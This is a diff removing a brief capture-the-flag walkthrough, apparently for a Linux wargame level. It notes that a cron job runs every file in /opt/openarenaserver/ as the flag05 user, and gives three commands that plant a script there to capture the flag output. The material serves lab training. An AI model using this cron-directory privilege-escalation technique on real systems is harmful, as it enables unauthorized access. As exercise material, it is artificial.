@@ -1,9 +1,0 @@
-`su -c "sh /usr/sbin/openarenaserver"` is run every 2 mins as flag05
-
-`/usr/sbin/openarenaserver` executes every file located in `/opt/openarenaserver/` using `bash`
-
-```
-echo 'getflag > /tmp/flag' > /opt/openarenaserver/g
-chmod +x /opt/openarenaserver/g
-sleep 120 && cat /tmp/flag
-```
